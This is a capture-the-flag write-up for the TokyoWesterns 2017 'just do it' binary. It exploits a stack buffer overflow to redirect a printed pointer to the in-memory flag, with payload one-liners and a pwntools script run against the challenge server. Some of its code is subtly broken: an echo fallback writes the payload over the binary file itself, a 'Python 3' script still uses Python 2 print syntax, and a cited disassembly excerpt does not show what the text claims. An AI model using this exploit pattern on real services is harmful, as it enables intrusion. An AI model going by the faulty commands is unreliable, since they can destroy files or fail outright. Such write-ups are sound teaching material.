# Just Do It!

This was originally a pwn challenge from the TokyoWesterns 2017 ctf.

Let's take a look at the binary:

```
$    file just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa

```

```
$    pwn checksec just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
[*] '/Hackery/west/doit/just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa'

    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see that it is a 32 bit binary, with a non executable stack. Let's try to run it.

```
$    ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
file open error.
: No such file or directory
```

So it is complaining about a file opening error, probably trying to open a file that isn't there. Let's look at the main function in Ghidra:

```
undefined4 main(void)

{
  char local_EAX_154;
  FILE *flagFile;
  int cmp;
  char vulnBuf [16];
  FILE *flagHandle;
  char *target;

  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  target = failed_message;
  flagFile = fopen("flag.txt","r");
  if (flagFile == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _local_EAX_154 = fgets(flag,0x30,flagFile);
  if (_local_EAX_154 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  _local_EAX_154 = fgets(vulnBuf,0x20,stdin);
  if (_local_EAX_154 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  cmp = strcmp(vulnBuf,PASSWORD);
  if (cmp == 0) {
    target = success_message;
  }
  puts(target);
  return 0;
}
```

So we can see that the file it is trying to open is `flag.txt`. We can also see that this binary will essentially prompt you for a password, and if it is the right password it will print in a logged in message. If not it will print an authentication error. Let's see what the value of `PASSWORD` is, so we can know what we need to set our input equal to to pass the check:

```
                             PASSWORD                                        XREF[2]:     Entry Point(*), main:080486d0(R)
        0804a03c c8 87 04 08     addr       s_P@SSW0RD_080487c8                              = "P@SSW0RD"
```

So we can see that the string it is checking for is `P@SSW0RD`. Now since our input is being scanned in through an fgets call, a newline character `0x0a` will be appended to the end. So in order to pass the check we will need to put a null byte after `P@SSW0RD`.

```
$    python -c 'print "P@SSW0RD" + "\x00"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
```

So we passed the check, however that doesn't solve the challenge. We can see that with the fgets call, we can input 32 bytes worth of data into `vulnBuf`. Let's see how many bytes `vulnBuf` can hold:

```

                                                                                                   0804864b(R)

                             main                                            XREF[4]:     Entry Point(*),
                                                                                          _start:080484d7(*), 0804886c,
                                                                                          080488c8(*)
        080485bb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
```

So we can see that it can hold 16 bytes worth of data (0x28 - 0x18 = 16). So we effectively have a buffer overflow vulnerability with the fgets call to `vulnBuf`. However it appears that we can't reach the `eip` register to get RCE. However we can reach `target` which is printed with a puts call, right before the function returns. So we can print whatever we want. That makes this code look really helpful:

```
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
```

So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `target` with that address and then it should print out the contents of `flag`, which should be the flag.

```
  .bss:0804A080 ; char flag[48]
.bss:0804A080 flag            db 30h dup(?)           ; DATA XREF: main+95o
.bss:0804A080 _bss            ends
.bss:0804A080
```

So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `vulnBuf` and `target` (0x28 - 0x14 = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`:

```
  python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
Welcome my secret service. Do you know the password?
Input the password.
flag{gottem_boyz}
```

This code depends on python version and in some cases doesn't work. If it didn't work for you, try this one:
```
  echo -n -e '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xa0\x04\x08' > ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
```

So we were able to read the contents of `flag.txt` with our exploit. Let's write an exploit to use the same exploit against the server they have with the challenge running to get the flag. Here is the python code:

```
#Import pwntools
from pwn import *

#Create the remote connection to the challenge
target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)

#Print out the starting prompt
print target.recvuntil("password.\n")

#Create the payload
payload = "\x00"*20 + p32(0x0804a080)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell, so we can read everything the server prints out
target.interactive()
```

```
# Python 3 version (tested on 3.9.7)
from pwn import *

#Create the remote connection to the challenge
target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)

#Print out the starting prompt
print target.recvuntil("password.\n")

#Create the payload
payload = b'\x00' * 20 + b'\x80\xa0\x04\x08'

#Send the payload
target.sendline(payload)

#Drop to an interactive shell, so we can read everything the server prints out
target.interactive()
```

Now let's run it:

```
$    python exploit.py
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12482: Done
Welcome my secret service. Do you know the password?
Input the password.

[*] Switching to interactive mode
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 12482
```

Just like that, we captured the flag!
